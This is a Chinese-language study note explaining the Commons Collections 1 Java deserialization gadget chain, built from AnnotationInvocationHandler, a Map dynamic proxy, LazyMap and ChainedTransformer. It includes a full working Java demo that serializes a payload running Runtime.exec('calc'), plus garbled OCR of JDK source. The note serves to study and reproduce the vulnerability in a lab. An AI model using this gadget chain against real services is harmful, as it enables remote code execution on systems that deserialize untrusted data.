## 一，链条总览
ObjectInputStream.readobject()

->AnnotationInvoktionHandler.readObject()

->memberValues.entrySet()

->proxyMap.entrySet()

->AnnotationInvocationHandler.invoke(methond:entrySet)

->lazyMap.get("entrySet")

->ChainedTransformer.transformer()

->Runtime.getRuntime().exec()

## 二，关键类及机制
1.AnnotationInvoktionHandler

`sun.reflect.annotation.AnnotationInvocationHandler` 是 JDK 内部的一个 `InvocationHandler` 实现类，专门用来处理**注解的动态代理对象**。它内部持有一个 `Map<String, Object> memberValues`，存放注解的成员名和对应的值。当代理上的方法（例如 `value()`）被调用时，它的 `invoke` 方法会把**方法名当作 key**，去 `memberValues` 里 `get(key)` 并返回结果

2.动态代理机制

`java.lang.reflect.Proxy`：运行时动态生成一个实现了指定接口（如 `Map`）的类，并创建其实例（即代理对象）。`InvocationHandler`：一个接口，只定义了一个方法 `invoke(Object proxy, Method method, Object[] args)`。  
代理对象上的**每一次方法调用**都会被直接转交给它绑定的 `InvocationHandler` 的 `invoke` 方法。**关系**：`Proxy` 负责“冒充”接口，`InvocationHandler` 负责“处置”调用。代理对象本身没有任何实现逻辑，完全依赖 handler

## 三，详细步骤
1.ObjectInputStream.readobject，服务端反序列化

2.AnnotationInvocationHandler.readobject

jdk 内置类，实现了 serializable 接口，在反序列化时会对 Map 属性：memberValues 进行迭代操作

<!-- 这是一张图片，ocr 内容为：PRIVATE VOID READOBJECT(OBJECTINPUTSTREAM VARL) THRONS IDEXCEPTION, CLASSNOTFOUNDEXCEPTION VAR1.DEFAULTREADOBJECT(); OBJECT VAR2 NULL; TRY { VAR10 - ANNOTATIONTYPE.GETINSTANCE(THIS.TYPE); CATCH (ILLEGALARGUMENTEXCEPTION VAR9){ ANNOTATION SERIAL STREAM"); THROW NEW INVALIDOBJECTEXCEPTION("NON-ANNOTATION TYPE IN MAP VAR3 - VAR10.MEMBERTYPES(); FOR (MAP.ENTRY VAR5 : THIS.MEMBERVALUES.ENTRYSET()) ( STRING VAR6 - (STRING) VAR5.GETKEY(); CLASS VAR7 ; (CLASS) VAR3.GET(VAR6); IF (VAR7 !- NULL) { OBJECT VAR8 - VAR5.GETVALUE(); IF (!VAR7.ISINSTANCE(VAR8) && !(VAR8 INSTANCEOF EXCEPTIONPROXY)) ( VARS.SETVALUE((NEW ANNOTATIONTYPEMISMATCHEXCEPTIONPROXY( S: VAR8.GETCLASS() + "[" VAR8 + "]")). -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1780221068181-1f7a0577-8ebe-4f35-8056-2b5001cbc2a8.png)

我们将 memberValues 替换成一个 lazyMap 的动态代理，当调用 entrySet 方法时会就走进代理的 invoke()方法

<!-- 这是一张图片，ocr 内容为：PUBLIC OBJECT INVOKE(OBJECT VARL, METHOD VAR2,OBJECTL)VAR3)I SURLUG VAR4 - VARZ.GEUNDME() CLASS[] VAR5 - VAR2.GETPARAMETERTYPES(); IF (VAR4.EQUALS("EQUALS") && VAR5.LENGTH -- 1 8& VARSTO)   OBJECT.CLASS) ( RETURN THIS.EQUALSIMPL(VAR3[O]); } ELSE IF (VAR5.LENGTH !- 0){ THROW NEW ASSERTIONERROR( DETAILMESSAGE:"TOO MANY PARAMETERS FOR AN ANNOTATION METHOD"); ELSE SWITCH (VAR4){ "TOSTRING": CASE RETURN THIS.TOSTRINGIMPL(); "HASHCODE"; CASE RETURN THIS.HASHCODEIMPL(); "ANNOTATIONTYPE": CASE RETURN THIS.TYPE; DEFAULT: OBJECT VAR6 - THIS.MEMBERVALUES.GET(VAR4); JULI){ IF (VAR6 三三 INCOMPLETEANNOTATIONEXCEPTION(THIS.TYPE, VAR4); THROW NEW ELSE IF (VAR6 INSTANCEOF EXCEPTIONPROXY) ((EXCEPTIONPROXY) VAR6).GENERATEEXCEPTION(); THROW ELSE { IF (VAR6.GETCLASS().ISARRAY() && ARRAY.GETLENGTH(VAR6) !- 0) ( VAR6 THIS.CLONEARRAY(VAR6); -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1780221165454-a1423450-1c81-4ee6-8a53-fdb60c52cd32.png)

可以看到 invoke 方法中对 toString、hashCode 等几个方法走了预定义的方法，而其他的会走 default 分支，从类的 memberValues 中取键名为我们传入的方法的值也就是 memberValues.get(entrySet)，memberValues 是一个 Map 类型的对象，我们将其替换为一个 lazyMap,就会触发 lazyMap.get(entrySet)

3.lazyMap 中不存在 entrySet 这个键名就会触发 lazyMap 的 factory 工厂函数

4.只需将构造的恶意 ChainedTransformer 链条放进工厂函数就会触发恶意链条的加载，最终执行 Runtime.exec()

## 四，demo 实现
```plain
package org.cc.repro.cc1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.cc.repro.common.SerializeUtil;
import org.omg.CORBA.portable.OutputStream;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/**
 * Commons Collections 1
 *
 * 入口: Transformer[] -> ChainedTransformer -> TransformedMap -> AnnotationInvocationHandler
 * JDK 当前: 8u65 ✅
 */
public class App {
    public static void main(String[] args) throws Exception {
        // 1. 构造 Transformer 链
        // 2. 包装为 LazyMap
        // 3. 通过 AnnotationInvocationHandler 触发
        Map innerMap=new HashMap();
        Transformer[] fakeTransformers = new Transformer[]{ new ConstantTransformer(1)};
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        Map lazyMap = LazyMap.decorate( innerMap,transformerChain);

        Transformer[] evilTranformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime",new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class,Object[].class},
                        new Object[]{null,new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"calc"}
                ),
                new ConstantTransformer(new HashSet<>())
        };

        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        //内层handler
        InvocationHandler innerHandler = (InvocationHandler) constructor.newInstance(Retention.class,lazyMap);
        //proxyMap
        Map proxyMap = (Map) Proxy.newProxyInstance(
                Map.class.getClassLoader(),
                new Class[]{Map.class},
                innerHandler
                );
        //外层handler
        InvocationHandler outerHandler =(InvocationHandler) constructor.newInstance(Retention.class,proxyMap);
        System.out.println("Before deserialize innerMap: " + innerMap);

        Field field = ChainedTransformer.class.getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(transformerChain,evilTranformers);

        // 6. 序列化 outerHandler
        serialize(outerHandler);

        // 7. 清空 innerMap，保证反序列化阶段 key 不存在
        innerMap.clear();

        // 8. 反序列化 outerHandler
        unserialize();

        System.out.println("After deserialize innerMap: " + innerMap);


    }
    public static void serialize(Object obj)throws Exception{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc1-stage3.bin"));
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize() throws Exception{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("cc1-stage3.bin"));
        Object obj=ois.readObject();
        ois.close();
        return obj;
    }
}

```

整个链中我们构造了**两个 **`**AnnotationInvocationHandler**`** 实例**（`innerHandler` 和 `outerHandler`）以及**一个 Map 动态代理对象**（`proxyMap`）。

+ `outerHandler` 的 `memberValues` 设置为 `proxyMap`。
+ `proxyMap` 的 handler 绑定为 `innerHandler`。
+ `innerHandler` 的 `memberValues` 设置为 `lazyMap`。

反序列化时，`outerHandler.readObject()` 对 `memberValues`（即 `proxyMap`）执行 `entrySet()`，调用被 `proxyMap` 转发给 `innerHandler.invoke`。  
后者将方法名 `"entrySet"` 作为 key 从 `lazyMap` 中取值，触发恶意 Transformer 链。

outerHandler  
    |  
    | memberValues  
    ↓  
 proxyMap  
    |  
    | InvocationHandler  
    ↓  
innerHandler  
    |  
    | memberValues  
    ↓  
 LazyMap  
    |  
    ↓  
ChainedTransformer

